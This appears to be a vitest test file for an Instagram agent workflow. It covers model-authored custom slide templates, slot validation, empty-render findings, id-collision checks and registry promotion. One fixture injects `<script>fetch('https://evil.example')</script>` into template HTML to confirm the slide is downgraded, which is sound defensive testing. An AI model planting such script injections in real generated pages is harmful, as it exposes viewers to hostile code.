import { describe, expect, it, afterEach, beforeEach } from "vitest";
import fsp from "node:fs/promises";
import pathMod from "node:path";
import { MemoryDurableStepStore, WorkflowEngine } from "@agent-engine/workflow";
import { MemoryTemplateStore } from "@agent-engine/tool-karos-templates";
import {
  createInstagramAgentWorkflow,
  customArchetypeTemplateId,
  validateCustomArchetypes,
} from "../src/workflow/create-instagram-agent-workflow.js";
import type { InstagramCopyOutput } from "../src/workflow/types.js";
import {
  goodRelevanceVerdict,
  goodTrendScoutOutput,
  fakeRenderCarousel,
  fakeRouterSequence,
  finalTurn,
  goodCopyOutput,
  goodImageCandidatePool,
  goodImageVettingOutput,
  goodResearchOutput,
  goodVisualQaOutput,
  makePromptStore,
  setupTestEnvironment,
  boringSlideMetrics,
  passingSlideMetrics,
  type TestEnvironment,
  pendingStudioRow,
} from "./test-helpers.js";
import { goodAngleProposal } from "./angle-fixtures.js";
import { validateCustomArchetypeSlots } from "../src/workflow/custom-archetype-checks.js";

const base = { clientSlug: "acme", productId: "instagram-agent", runKind: "recurring" as const };

/** `goodCopyOutput()`'s slide 2 turned into a valid, clean custom archetype. */
function withCustomArchetype(overrides: { archetypeId?: string; bodyHtml?: string } = {}): InstagramCopyOutput {
  const good = goodCopyOutput();
  return {
    ...good,
    slides: good.slides.map((s, i) =>
      i === 1
        ? {
            ...s,
            layout: "custom" as const,
            customArchetype: {
              archetypeId: overrides.archetypeId ?? "custom_bold_diagonal",
              name: "Bold diagonal stat",
              rationale: "none of the six standard archetypes give this figure the full-bleed diagonal treatment the client asked for",
              bodyHtml: overrides.bodyHtml ?? `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p></div>`,
              css: ".wrap h1 { font-family: var(--f-display); color: var(--fg); } .wrap p { color: var(--accent); }",
              slots: ["note"],
              fields: { note: "a supporting line the model wrote for this slide" },
            },
          }
        : s,
    ),
  };
}

describe("custom archetypes: authoring, safety, and promotion", () => {
  let env: TestEnvironment;
  beforeEach(async () => {
    // The promotion test below runs two full workflows against the same
    // client — the topic-floor guard (Fix 1) holds a reservation that would
    // leave the lane's unused-topic buffer below 5, so the default 6-topic
    // seed (which comfortably covers every OTHER test's single run) isn't
    // enough here.
    env = await setupTestEnvironment({
      seedTopics: Array.from({ length: 10 }, (_, i) => `topic ${i + 1} for custom archetype tests`),
    });
  });
  afterEach(async () => {
    await env.cleanup();
  });

  it("renders a run-authored custom archetype end to end", async () => {
    // One DISABLED studio row, so `00c-check-template-studio` resolves
    // `awaiting-approval` and the studio's paid block is skipped (this
    // fixture's router queues no studio turns). `materializeTemplates` lists
    // only enabled rows, so nothing about the render changes.
    const store = new MemoryTemplateStore([pendingStudioRow()]);
    const copy = withCustomArchetype();
    const router = fakeRouterSequence([
      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
      finalTurn(copy),
      finalTurn(goodImageVettingOutput()),
      finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
    ]);

    const durableStore = new MemoryDurableStepStore();
    const result = await new WorkflowEngine(durableStore).run(
      createInstagramAgentWorkflow({
        tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
        promptStore: makePromptStore(),
        router,
        repoRoot: env.repoRoot,
        imageCandidatePool: goodImageCandidatePool(),
        autoApprove: true,
        templateStore: store,
      }),
      { runId: "custom_happy", ...base },
    );

    expect(result.status).toBe("completed");
    const steps = await durableStore.listSteps("custom_happy");
    const slidesData = steps.find((s) => s.stepId === "07c-emit-slides-data-attempt-1")?.output as
      | { slides: Array<{ n: number; template: string; fields: Record<string, string> }> }
      | undefined;
    const slide2 = slidesData?.slides.find((s) => s.n === 2);
    expect(slide2?.template).toBe("custom-bold-diagonal.html");
    expect(slide2?.fields["note"]).toBe("a supporting line the model wrote for this slide");

    // The materialized file is real, on disk, and is what the renderer's
    // OWN real path/existence check (`validateRenderInputs`, exercised by
    // `fakeRenderCarousel`) actually resolved against — not a fake.
    const written = await fsp.readFile(pathMod.join(env.repoRoot, ".template-cache", "custom_happy", "custom-bold-diagonal.html"), "utf8");
    expect(written).toContain("{{note}}");
    expect(written).toContain("window.__CAROUSEL_READY__ = true;");
  }, 30000);

  it("downgrades a slide whose custom archetype tries to smuggle a <script>, rather than failing the run", async () => {
    // One DISABLED studio row, so `00c-check-template-studio` resolves
    // `awaiting-approval` and the studio's paid block is skipped (this
    // fixture's router queues no studio turns). `materializeTemplates` lists
    // only enabled rows, so nothing about the render changes.
    const store = new MemoryTemplateStore([pendingStudioRow()]);
    const copy = withCustomArchetype({ bodyHtml: `<div><script>fetch('https://evil.example')</script>{{note}}</div>` });
    const router = fakeRouterSequence([
      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
      finalTurn(copy),
      finalTurn(goodImageVettingOutput()),
      finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
    ]);

    const durableStore = new MemoryDurableStepStore();
    const result = await new WorkflowEngine(durableStore).run(
      createInstagramAgentWorkflow({
        tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
        promptStore: makePromptStore(),
        router,
        repoRoot: env.repoRoot,
        imageCandidatePool: goodImageCandidatePool(),
        autoApprove: true,
        templateStore: store,
      }),
      { runId: "custom_unsafe", ...base },
    );

    expect(result.status).toBe("completed");
    const steps = await durableStore.listSteps("custom_unsafe");
    const slidesData = steps.find((s) => s.stepId === "07c-emit-slides-data-attempt-1")?.output as
      | { slides: Array<{ n: number; template: string }> }
      | undefined;
    // Downgraded to the client's own base template, never held and never
    // rendered with the smuggled script.
    expect(slidesData?.slides.find((s) => s.n === 2)?.template).toBe("slide.html");
  }, 30000);

  it("degrades a slide whose custom archetype references a slot nothing fills, rather than rendering a hole", async () => {
    // Item O's slot contract (`validateCustomArchetypeSlots`), free and
    // pre-render. `materializeTemplates` substitutes what it is given and
    // leaves the rest, so `{{price}}` reaches the slide as literal text and
    // nothing downstream fails: today that ships. Green once the integrator
    // lands note (e) — `validateCustomArchetypes` additionally calling
    // `validateCustomArchetypeSlots`.
    // One DISABLED studio row, so `00c-check-template-studio` resolves
    // `awaiting-approval` and the studio's paid block is skipped (this
    // fixture's router queues no studio turns). `materializeTemplates` lists
    // only enabled rows, so nothing about the render changes.
    const store = new MemoryTemplateStore([pendingStudioRow()]);
    const copy = withCustomArchetype({ bodyHtml: `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p><em>{{price}}</em></div>` });
    const router = fakeRouterSequence([
      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
      finalTurn(copy),
      finalTurn(goodImageVettingOutput()),
      finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
    ]);

    const durableStore = new MemoryDurableStepStore();
    const result = await new WorkflowEngine(durableStore).run(
      createInstagramAgentWorkflow({
        tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
        promptStore: makePromptStore(),
        router,
        repoRoot: env.repoRoot,
        imageCandidatePool: goodImageCandidatePool(),
        autoApprove: true,
        templateStore: store,
      }),
      { runId: "custom_unfilled_slot", ...base },
    );

    expect(result.status).toBe("completed");
    const steps = await durableStore.listSteps("custom_unfilled_slot");
    const slidesData = steps.find((s) => s.stepId === "07c-emit-slides-data-attempt-1")?.output as
      | { slides: Array<{ n: number; template: string }> }
      | undefined;
    // Degraded through the same path a `stat_callout` with no `stat` takes.
    expect(slidesData?.slides.find((s) => s.n === 2)?.template).not.toBe("custom-bold-diagonal.html");
    // The finding is a pure-function verdict, asserted directly so the reason
    // text is pinned where a reader of this file can see it.
    expect(validateCustomArchetypeSlots(copy.slides[1]!.customArchetype!)).toMatchObject({ ok: false });
  }, 30000);

  it("a custom archetype whose render measures empty produces an interest finding naming custom-<id>", async () => {
    // Item L IS item O's render validation: no separate render-and-check pass
    // exists, and a custom design that renders empty fails `08a1` like any
    // other slide. Green once the integrator lands step 9 of the Phase 2
    // wiring order (WP-C2's `08a1-interest-floor-attempt-N`).
    // One DISABLED studio row, so `00c-check-template-studio` resolves
    // `awaiting-approval` and the studio's paid block is skipped (this
    // fixture's router queues no studio turns). `materializeTemplates` lists
    // only enabled rows, so nothing about the render changes.
    const store = new MemoryTemplateStore([pendingStudioRow()]);
    const copy = withCustomArchetype();
    // Three drafting attempts: `08a1` sits BEFORE `08b`, so the two refused
    // attempts spend copy + vetting + relevance and no visual-QA turn, and
    // the angle is proposed once per REVISION rather than once per attempt.
    const router = fakeRouterSequence([
      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
      finalTurn(copy), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()),
      finalTurn(copy), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()),
      finalTurn(copy), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()),
      finalTurn(goodVisualQaOutput()),
    ]);

    const durableStore = new MemoryDurableStepStore();
    const result = await new WorkflowEngine(durableStore).run(
      createInstagramAgentWorkflow({
        tools: {
          ...env.tools,
          // The custom slide measures as an empty plate; every other slide passes.
          "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!, {
            metrics: (slide) => (slide.n === 2 ? boringSlideMetrics() : passingSlideMetrics()),
          }),
        },
        promptStore: makePromptStore(),
        router,
        repoRoot: env.repoRoot,
        imageCandidatePool: goodImageCandidatePool(),
        autoApprove: true,
        templateStore: store,
      }),
      { runId: "custom_empty_render", ...base },
    );

    // Never held: a picture/layout problem ships degraded with the numbers.
    expect(result.status).not.toBe("held");
    const steps = await durableStore.listSteps("custom_empty_render");
    const floor = steps.find((s) => s.stepId === "08a1-interest-floor-attempt-1")?.output as
      | { findings?: Array<{ slide: number; kind: string; sentence: string }> }
      | undefined;
    expect(floor?.findings?.some((f) => f.slide === 2)).toBe(true);
    expect(JSON.stringify(floor?.findings ?? [])).toContain("custom-custom_bold_diagonal");
  }, 60000);

  it("belt-and-suspenders: refuses a custom archetypeId that collides with a real archetype id", () => {
    const good = goodCopyOutput();
    // Bypasses the schema's own `custom_` regex deliberately — this proves
    // the RUNTIME collision check, which exists precisely because a schema
    // regex is one edit away from being loosened later.
    const copy = {
      ...good,
      slides: good.slides.map((s, i) =>
        i === 1
          ? {
              ...s,
              layout: "custom" as const,
              customArchetype: {
                archetypeId: "stat_callout",
                name: "collision attempt",
                rationale: "x",
                bodyHtml: "<div>{{note}}</div>",
                css: "",
                slots: ["note"],
                fields: { note: "x" },
              },
            }
          : s,
      ),
    } as unknown as InstagramCopyOutput;

    expect(validateCustomArchetypes(copy)).toHaveLength(0);
  });

  it("promotes a custom archetype into the registry when the reviewer sets promote: true, and only reviews it (never re-promotes) on a later round", async () => {
    // One DISABLED studio row, so `00c-check-template-studio` resolves
    // `awaiting-approval` and the studio's paid block is skipped (this
    // fixture's router queues no studio turns). `materializeTemplates` lists
    // only enabled rows, so nothing about the render changes.
    const store = new MemoryTemplateStore([pendingStudioRow()]);
    const copy = withCustomArchetype();
    const revised = { ...copy, caption: `${copy.caption} (revised)` };
    // The angle proposal (04i) leads each ROUND: one per revision.
  const draftTurns = (c: InstagramCopyOutput) => [finalTurn(goodAngleProposal()), finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput())];
    const router = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(copy), ...draftTurns(revised)]);

    const workflowFn = createInstagramAgentWorkflow({
      tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
      promptStore: makePromptStore(),
      router,
      repoRoot: env.repoRoot,
      imageCandidatePool: goodImageCandidatePool(),
      templateStore: store,
    });

    const durableStore = new MemoryDurableStepStore();
    const engine = new WorkflowEngine(durableStore);
    const runId = "custom_promote";
    const templateId = customArchetypeTemplateId("acme", "custom_bold_diagonal");

    const r0 = await engine.run(workflowFn, { runId, ...base });
    expect(r0.status).toBe("awaiting_gate");

    await engine.resolveGate(runId, "09a-batch-review-r0", {
      decision: "approve",
      actor: "jane@karoslabs.com",
      at: new Date().toISOString(),
      templateFeedback: [{ slide: 2, templateId, verdict: "approved", note: "great use of the diagonal treatment", promote: true }],
    });
    const r1 = await engine.run(workflowFn, { runId, ...base });
    expect(r1.status).toBe("completed");

    const promoted = await store.get(templateId);
    expect(promoted).toBeDefined();
    expect(promoted?.source).toBe("ai_generated");
    expect(promoted?.qualityScore).toBe(40);
    expect(promoted?.htmlTemplate).toContain("{{note}}");
    expect(promoted?.cssStyles).toContain("var(--accent)");

    // A SECOND run whose reviewer promotes the SAME archetypeId again must
    // take the review path, not re-promote — otherwise a same-id double
    // promotion would silently reset the score back to 40. Its COPY is
    // deliberately different text: run 1's delivery entered the shipped-
    // output dedup window, and a second run re-shipping identical copy is
    // exactly what the 07d similarity check exists to redraft.
    const differentCopy: InstagramCopyOutput = {
      ...copy,
      caption: "An entirely new look at how support teams handle triage under pressure this winter season.",
      slides: copy.slides.map((s, i) => ({
        ...s,
        headline: `A different angle ${i + 1}`,
        body: `Fresh sentence number ${i + 1} covering another aspect of the team's workflow changes without echoing earlier phrasing.`,
      })),
    };
    const router2 = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(differentCopy)]);
    const workflowFn2 = createInstagramAgentWorkflow({
      tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
      promptStore: makePromptStore(),
      router: router2,
      repoRoot: env.repoRoot,
      imageCandidatePool: goodImageCandidatePool(),
      templateStore: store,
    });
    const runId2 = "custom_promote_again";
    const r2 = await engine.run(workflowFn2, { runId: runId2, ...base });
    expect(r2.status).toBe("awaiting_gate");
    await engine.resolveGate(runId2, "09a-batch-review-r0", {
      decision: "approve",
      actor: "jane@karoslabs.com",
      at: new Date().toISOString(),
      templateFeedback: [{ slide: 2, templateId, verdict: "approved", note: "still great", promote: true }],
    });
    const r3 = await engine.run(workflowFn2, { runId: runId2, ...base });
    expect(r3.status).toBe("completed");

    // Reviewed, not re-promoted: qualityScore moved by the ordinary approval
    // delta (+5) from its already-promoted 40, not reset back to 40.
    expect((await store.get(templateId))!.qualityScore).toBe(45);
  }, 60000);
});
